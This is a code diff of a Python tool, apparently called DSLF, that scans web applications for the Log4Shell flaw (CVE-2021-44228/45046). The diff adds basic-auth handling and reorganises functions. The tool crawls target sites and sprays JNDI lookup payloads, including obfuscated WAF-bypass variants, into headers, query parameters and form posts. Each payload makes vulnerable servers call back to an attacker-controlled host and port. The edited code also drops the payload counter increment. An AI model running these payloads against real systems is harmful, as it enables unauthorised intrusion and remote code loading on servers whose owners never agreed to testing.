@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import argparse, base64, random, requests, string, sys, time, urllib3
 from bs4 import BeautifulSoup
 from datetime import datetime
@@ -8,6 +7,7 @@ from urllib.parse import urljoin
 TIMEOUT = 5
 WAIT_MIN = 500000
 WAIT_RAND_MAX = 600000
+
 
 HEADER_UA = {'1': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
              '2': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
@@ -44,18 +44,50 @@ PAYLOAD_NASTY = ['${${lower:jndi}:${lower:ldap}://{{EVIL}}:{{PORT}}/a}',
                  '${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{EVIL}}:{{PORT}}/a}']
 PAYLOAD_FILES = {'ldap': 'waf_bypass_ldap.txt', 'http': 'waf_bypass_http.txt', 'dns': 'waf_bypass_dns.txt'}
 
-
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+
 ###
-def crawler_add2queue(path, url, queue):
-  if path.startswith(url) and path not in queue:
-    queue.append(path)
-    #cprint(f'[!]   -> {path}', 'cyan')
+def show_banner(_url, _auth, _evil_site, _evil_port, _callback, _crawl, _method, _param, _header, _data, _payload, _sleep):
+  print('')
+  cprint('[•] DSLF - (D)arth (S)ide of the (L)og4j (F)orce', 'green', attrs=['bold'])
+  cprint('[•] Author: Julien GARAVET', 'green')
+  cprint('[•] + Passive Callback  Module aka `PCM`', 'green')
+  cprint('[•] + Active  Callback  Module aka `ACM`', 'green')
+  cprint('[•] + Active  Scanner   Module aka `ASM`', 'green')
+  cprint('[•] + Payload Generator Module aka `PGM`', 'green')
+  print('')
+  cprint('[*] ASM - Active Scanner Module - Intels', 'green', attrs=['bold'])
+  cprint('[*] CVE-2021-44228 with payload similar to ${jndi:ldap://' + _evil_site + ':' + _evil_port + '/a}', 'green')
+  cprint('[*] CVE-2021-45046 with payload similar to ${jndi:ldap://127.0.0.1#' + _evil_site + ':' + _evil_port + '/a}', 'green')
+  time.sleep(_sleep)
+  print('')
+  cprint('[+] ASM - Active Scanner Module - Settings', 'yellow', attrs=['bold'])
+  cprint(f'[+] Url         {_url}', 'yellow')
+  cprint(f'[+] Auth        {_auth}', 'yellow')
+  cprint(f'[+] Evil_site   {_evil_site}', 'yellow')
+  cprint(f'[+] Evil_port   {_evil_port}', 'yellow')
+  cprint(f'[+] Callback    {_callback}', 'yellow')
+  cprint(f'[+] Crawler     {_crawl}', 'yellow')
+  cprint(f'[+] Method      {_method}', 'yellow')
+  cprint(f'[+] Param       {_param}', 'yellow')
+  cprint(f'[+] Header      {_header}', 'yellow')
+  cprint(f'[+] Data        {_data}', 'yellow')
+  cprint(f'[+] Payload     {_payload}', 'yellow')
+  time.sleep(_sleep)
+  print('')
+  cprint('[!] ASM - Active Scanner Module - Starting', 'cyan', attrs=['bold'])
+  time.sleep(_sleep)
 
 
 ###
-def crawler_get_url(url, html, queue):
+def crawler_get_url(url, creds, queue, chaos):
+  headers = {}
+  headers.update({'User-agent': HEADER_UA[chaos]})
+  if creds != 'no':
+    headers.update({'Authorization': 'Basic ' + creds})
+  html = requests.get(url, headers=headers, verify=False, timeout=TIMEOUT).text
+
   soup = BeautifulSoup(html, 'html.parser')
   for link in soup.find_all('a'):
     path = link.get('href')
@@ -63,90 +95,56 @@ def crawler_get_url(url, html, queue):
       if path and path.startswith('/'):
         path = urljoin(url, path)
       crawler_add2queue(path, url, queue)
+  
+
+###
+def crawler_add2queue(path, url, queue):
+  if path.startswith(url) and path not in queue:
+    queue.append(path)
+    cprint(f'[!]   -> {path}', 'cyan')
 
 
 ###
-def get_payloads(_payload, _evil_site, _evil_port, _callback):
-  payloads = []
-
-  if _payload == 'classic':
-    for p in PAYLOAD_CLASSIC:
-      payload = p.replace('{{EVIL}}', _evil_site)
-      payload = payload.replace('{{PORT}}', _evil_port)
-      payloads.append(payload)
-
-  elif _payload == 'random':
-    tmp_payloads = []
-    with open(PAYLOAD_FILES[_callback], 'r') as fp:
-      for line in fp.readlines():
-        line = line.strip()
-        line = line.replace('{{EVIL}}', _evil_site)
-        line = line.replace('{{PORT}}', _evil_port)
-        tmp_payloads.append(line)
-    for i in range(0, 10):
-      chaos = random.randint(1, len(tmp_payloads))
-      payloads.append(tmp_payloads[chaos])
-
-  elif _payload == 'extended':
-    with open(PAYLOAD_FILES[_callback], 'r') as fp:
-      for line in fp.readlines():
-        line = line.strip()
-        line = line.replace('{{EVIL}}', _evil_site)
-        line = line.replace('{{PORT}}', _evil_port)
-        payloads.append(line)
-
-  elif _payload == 'nasty':
-    for p in PAYLOAD_NASTY:
-      payload = p.replace('{{EVIL}}', _evil_site)
-      payload = payload.replace('{{PORT}}', _evil_port)
-      payloads.append(payload)
-
-  return payloads
+def handle_401(url, _auth):
+  cprint('[!] Using given credentials', 'cyan')
+  with open(_auth, 'r') as fp:
+    creds = fp.readline()
+    creds = creds.strip()
+    creds = creds.encode('ascii')
+    creds64_b = base64.b64encode(creds)
+    creds64_m = creds64_b.decode('ascii')
+  return creds64_m
 
 
 ###
-def get_headers(header, payload):
-  headers = {}
-
-  if header == 'none':
-    chaos = str(random.randint(1, len(HEADER_UA)))
-    headers.update({'User-agent': HEADER_UA[chaos]})
-  else:
-    for h in HEADER_CLASSIC:
-      if 'User-agent' in h and header == 'noua':
-        chaos = str(random.randint(1, len(HEADER_UA)))
-        headers.update({'User-agent': HEADER_UA[chaos]})
-      else:
-        value = HEADER_CLASSIC[h]
-        value = value.replace('{{PAYLOAD}}', payload)
-        headers.update({h: value})
-  return headers
-
-
-###
-def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload):
+def scanner(_url, creds, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload, chaos):
   payloads = get_payloads(_payload, _evil_site, _evil_port, _callback)
   max_payloads = len(payloads)
   cpt_payloads = 1
 
-  try:
-    chaos = str(random.randint(1, len(HEADER_UA)))
-    response = requests.get(_url, headers={'User-agent': HEADER_UA[chaos]}, verify=False, allow_redirects=True, timeout=TIMEOUT)
-    soup = BeautifulSoup(response.content, 'html.parser')
-  except:
-    cprint('[!] FATAL: the given URL is not reachable', 'red', attrs=['bold'])
-    return
-
-  cprint(f'[!]   -> HTTP Code {response.status_code}', 'cyan')
+  if _method == 'post' or _method == 'both':
+    try:
+      headers2 = {}
+      headers2.update({'User-agent': HEADER_UA[chaos]})
+      if creds != 'no':
+        headers2.update({'Authorization': 'Basic ' + creds})
+      response = requests.get(url=_url, headers=headers2, verify=False, allow_redirects=True, timeout=TIMEOUT)
+      soup = BeautifulSoup(response.content, 'html.parser')
+    except:
+      print('ERRRRRRRRRRRRRRRRRRRRRROR')
 
   for payload in payloads:
     now = datetime.now()
     now = now.strftime("%d/%m/%Y %H:%M:%S")
+
+    headers = get_headers(_header, payload, chaos)
+    if creds != 'no':
+      headers.update({'Authorization': 'Basic ' + creds})
+
     cprint(f'[!]   -> Current payload {cpt_payloads}/{max_payloads} ({now}): {payload}', 'cyan')
 
     # _method = get
     if _method == 'get' or _method == 'both':
-      headers = get_headers(_header, payload)
       if _param == 'none':
         requests.request(url=_url, method='GET', headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
       elif _param == 'classic':
@@ -155,28 +153,13 @@ def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _
 
     # _method = post
     if _method == 'post' or _method == 'both':
-      headers = get_headers(_header, payload)
-
-      if response.status_code == 401:
-        headers = {}
-        creds = payload + ':' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-        creds = creds.encode('ascii')
-        creds64_b = base64.b64encode(creds)
-        creds64_m = creds64_b.decode('ascii')
-        headers.update({'Authorization': 'Basic ' + creds64_m})
-        requests.request(url=_url, method='GET', headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
-
-        time.sleep((WAIT_MIN + random.randint(1, WAIT_RAND_MAX)) / 1000000.0)
-        cpt_payloads = cpt_payloads + 1
-        continue
-
       try:
         soup_inputs = soup.find_all('input')
         soup_action = soup.form['action']
         url = _url + soup_action
       except:
         cprint('[!]      Can\'t use POST method so using GET: did not find any form to post', 'magenta')
-        headers = {}
+        #headers = {}
         if _param == 'none':
           requests.request(url=_url, method='GET', headers=headers, verify=False, allow_redirects=True, timeout=TIMEOUT)
         elif _param == 'classic':
@@ -221,7 +204,61 @@ def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _
             time.sleep((WAIT_MIN + random.randint(1, WAIT_RAND_MAX)) / 1000000.0)
           except:
             cprint('[!] Potential vulnerability found: true positive or network blocking (check out in Active/Passive Callback Modules logs)', 'red', attrs=['bold'])
-    cpt_payloads = cpt_payloads + 1
+      
+
+###
+def get_payloads(_payload, _evil_site, _evil_port, _callback):
+  payloads = []
+  if _payload == 'classic':
+    for p in PAYLOAD_CLASSIC:
+      payload = p.replace('{{EVIL}}', _evil_site)
+      payload = payload.replace('{{PORT}}', _evil_port)
+      payloads.append(payload)
+
+  elif _payload == 'random':
+    tmp_payloads = []
+    with open(PAYLOAD_FILES[_callback], 'r') as fp:
+      for line in fp.readlines():
+        line = line.strip()
+        line = line.replace('{{EVIL}}', _evil_site)
+        line = line.replace('{{PORT}}', _evil_port)
+        tmp_payloads.append(line)
+    for i in range(0, 10):
+      chaos = random.randint(1, len(tmp_payloads))
+      payloads.append(tmp_payloads[chaos])
+
+  elif _payload == 'extended':
+    with open(PAYLOAD_FILES[_callback], 'r') as fp:
+      for line in fp.readlines():
+        line = line.strip()
+        line = line.replace('{{EVIL}}', _evil_site)
+        line = line.replace('{{PORT}}', _evil_port)
+        payloads.append(line)
+
+  elif _payload == 'nasty':
+    for p in PAYLOAD_NASTY:
+      payload = p.replace('{{EVIL}}', _evil_site)
+      payload = payload.replace('{{PORT}}', _evil_port)
+      payloads.append(payload)
+
+  return payloads
+
+
+###
+def get_headers(header, payload, chaos):
+  headers = {}
+  if header == 'none':
+    headers.update({'User-agent': HEADER_UA[chaos]})
+  elif header == 'classic' or header == 'noua':
+    for h in HEADER_CLASSIC:
+      if 'User-agent' in h and header == 'noua':
+        headers.update({'User-agent': HEADER_UA[chaos]})        
+      else:
+        value = HEADER_CLASSIC[h]
+        value = value.replace('{{PAYLOAD}}', payload)
+        headers.update({h: value})
+  return headers
+
 
 ###
 def main():
@@ -231,10 +268,11 @@ def main():
 
   parser = argparse.ArgumentParser()
   parser.add_argument('--url', action='store', dest='url', required=True, help='URL or file with URL to scan')
+  parser.add_argument('--auth', action='store', dest='auth', default='no', help='no or file containing 401 credentials in user:pass format')
   parser.add_argument('--evil_site', action='store', dest='evilsite', required=True, help='IP or FQDN for the callback')
   parser.add_argument('--evil_port', action='store', dest='evilport', required=True, help='TCP port for the callback')
   parser.add_argument('--callback', action='store', default='ldap', dest='callback', help='ldap, http or dns')
-  parser.add_argument('--crawl', action='store', default='no', dest='crawl', help='no or yes')
+  parser.add_argument('--crawl', action='store', default='no', dest='crawl', help='no, yes, quick')
   parser.add_argument('--method', action='store', default='get', dest='method', help='get, post or both')
   parser.add_argument('--param', action='store', default='classic', dest='param', help='none or classic')
   parser.add_argument('--header', action='store', default='classic', dest='header', help='none, classic or noua')
@@ -253,6 +291,7 @@ def main():
           line = line.strip()
           _url.append(line)
 
+    _auth = args.auth
     _evil_site = args.evilsite
     _evil_port = args.evilport
     _callback = args.callback
@@ -263,85 +302,58 @@ def main():
     _data = args.data
     _payload = args.payload
 
-    print('')
-    cprint('[•] DSLF - (D)arth (S)ide of the (L)og4j (F)orce', 'green', attrs=['bold'])
-    cprint('[•] Author: Julien GARAVET', 'green')
-    cprint('[•] + Passive Callback  Module aka `PCM`', 'green')
-    cprint('[•] + Active  Callback  Module aka `ACM`', 'green')
-    cprint('[•] + Active  Scanner   Module aka `ASM`', 'green')
-    cprint('[•] + Payload Generator Module aka `PGM`', 'green')
-    tmp = """　　　　　　　　　　　　　　　┌―――┐
-　　　　　　　　　　　　_,―￣||￣￣￣￣￣ ||￣ー､______
-　　　　　　　　　　　「| ''　[] '|　''　　''　| ' □''|
-　　　　_ｨ´ニ￣T＿|_|　　　　|　:　　:三|　:　　:　:  |
-　,_＿{= (　 )ﾐ□†||||]| ,,　 ｪｪ|　:　　:￣|　,,　 :,, |
-　 '￣ー二*―-￣｀┴┬┬┼―┬―┬―┬―┬―┬―┬―┬―┬―┬―┬┰┰―┬―┬―┬―┬―┬┬┘
-　　　　　　　　　　　　 .(◎/_ｊ｀┸┸        ´ｔ_＿{◎}　　　　　　　　　
-　　　　　　　　　　　　/　/￣　　　　　     匸| |　|　　　　　　　
-　　　　　　　　　　　 /　/|　　　　　　　  |　|　|　|
-　　　　　　　　　　　 ◎ ( ◎＼　　　　　     ◎　    ◎
-　　　　　　　　　　　|　|　＼＼　　　　 　 |　|　 |　|
-                      |　|  |　|            |  |   |　|
-　　　  　　　　　　　<00>　<00>　　        <00>   <00>"""
-    cprint(tmp, 'green')
-    print('')
-    cprint('[*] ASM - Active Scanner Module - Intels', 'green', attrs=['bold'])
-    cprint('[*] CVE-2021-44228 with payload similar to ${jndi:ldap://' + _evil_site + ':' + _evil_port + '/a}', 'green')
-    cprint('[*] CVE-2021-45046 with payload similar to ${jndi:ldap://127.0.0.1#' + _evil_site + ':' + _evil_port + '/a}', 'green')
-    time.sleep(1)
-    print('')
-    cprint('[+] ASM - Active Scanner Module - Settings', 'yellow', attrs=['bold'])
-    cprint(f'[+] Url         {url_tmp}', 'yellow')
-    cprint(f'[+] Evil_site   {_evil_site}', 'yellow')
-    cprint(f'[+] Evil_port   {_evil_port}', 'yellow')
-    cprint(f'[+] Callback    {_callback}', 'yellow')
-    cprint(f'[+] Crawler     {_crawl}', 'yellow')
-    cprint(f'[+] Method      {_method}', 'yellow')
-    cprint(f'[+] Param       {_param}', 'yellow')
-    cprint(f'[+] Header      {_header}', 'yellow')
-    cprint(f'[+] Data        {_data}', 'yellow')
-    cprint(f'[+] Payload     {_payload}', 'yellow')
-    time.sleep(1)
-    print('')
-    cprint('[!] ASM - Active Scanner Module - Starting', 'cyan', attrs=['bold'])
-    time.sleep(1)
+    #show_banner(url_tmp, _auth, _evil_site, _evil_port, _callback, _crawl, _method, _param, _header, _data, _payload, 1)
 
     for main_url in _url:
+
+      try:
+        chaos = str(random.randint(1, len(HEADER_UA)))
+        response = requests.get(main_url, headers={'User-agent': HEADER_UA[chaos]}, verify=False, allow_redirects=True, timeout=TIMEOUT)
+      except:
+        cprint(f'[!] > Processing {main_url}', 'cyan', attrs=['bold'])
+        cprint('[!] FATAL: the given URL is not reachable', 'red', attrs=['bold'])
+        print()
+        continue
+
+      cprint(f'[!] > Processing {main_url}', 'cyan', attrs=['bold'])
+      cprint(f'[!] Received {response.status_code} HTTP Code', 'cyan')
+      
+      creds = 'no'
+      if _auth != 'no' and response.status_code == 401:
+        creds = handle_401(main_url, _auth)
+      elif _auth == 'no' and response.status_code == 401:
+        cprint('[!] FATAL: can\'t go through 401 prompt', 'red', attrs=['bold'])
+        print()
+        continue
+
+
       if _crawl == 'yes' or _crawl == 'quick':
-        cprint('[!] -------------------------------------', 'cyan')
-        cprint(f'[!] Processing {main_url}', 'cyan', attrs=['bold'])
         if _crawl == 'quick':
           cprint('[!] Quick crawl is limited to 10 URL', 'cyan')
 
         queue = []
         queue.append(main_url)
-
         quick = 0
         for u in queue:
           if _crawl == 'quick':
             if quick >= 10:
               continue
             quick = quick + 1
-          try:
-            html = requests.get(u, verify=False).text
-          except:
-            cprint('[!] FATAL: the given URL is not reachable', 'red', attrs=['bold'])
-            continue
           cprint('[!] Crawling ' + u, 'cyan')
-          crawler_get_url(u, html, queue)
+          crawler_get_url(u, creds, queue, chaos)
           cprint(f'[!] Scanning {u}', 'cyan')
-          scanner(u, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload)
+          scanner(u, creds, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload, chaos)
       else:
-        cprint('[!] -------------------------------------', 'cyan')
-        cprint(f'[!] Processing {main_url}', 'cyan', attrs=['bold'])
         cprint(f'[!] Not Crawling {main_url}', 'cyan')
         cprint(f'[!] Scanning {main_url}', 'cyan')
-        scanner(main_url, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload)
+        scanner(main_url, creds, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload, chaos)
+      print()
+
 
   except KeyboardInterrupt:
     cprint("user interuption", 'red')
     raise SystemExit(0)
 
-
+### 
 if __name__ == "__main__":
   main()
